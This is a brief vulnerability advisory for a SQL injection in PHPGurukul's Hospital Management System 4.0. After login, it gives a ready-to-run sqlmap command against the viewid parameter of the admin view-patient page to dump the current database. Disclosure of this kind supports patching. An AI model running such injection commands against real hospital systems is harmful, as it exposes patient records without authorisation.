* Title: Hospital Management System SQLI
* Exploit Author: Thinkland Security Team  
* Vendor Homepage:https://phpgurukul.com/hospital-management-system-in-php  
* Software Link:https://phpgurukul.com/wp-content/uploads/2018/02/Hospital-Management-System-Project.zip  
* Version: 4.0  
* Vulnerability verification  
1. Enter username and password to log in  
2. Use sqlmap command： sqlmap.py -u http://192.168.50.34/Hospital%20Management%20System%20Project/hospital/hms/admin/view-patient.php?viewid=1 --batch --current-db
![image](https://github.com/BigTiger2020/Hospital-Management-System/blob/main/sql.png)  
